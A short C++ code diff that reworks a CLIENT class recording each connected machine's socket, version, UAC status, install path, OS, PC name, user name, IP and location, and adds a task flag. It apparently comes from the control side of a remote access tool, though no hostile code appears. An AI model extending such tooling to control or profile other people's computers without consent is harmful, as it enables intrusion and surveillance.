@@ -6,17 +6,18 @@ class CLIENT
 		struct INFO
 		{
 			string Versione;
-			bool UAC = false;
+			string UAC;
 			string InstallPath;
 			string OS;
 			string PCname;
 			string UserName;
 			string IP;
-			string Nazione;
+			IPinfo Location;
 		};
 
 	public:
 		SOCKET sock;
 		bool IsConnected = false;
 		INFO info;
+		bool InTask = false;
 };
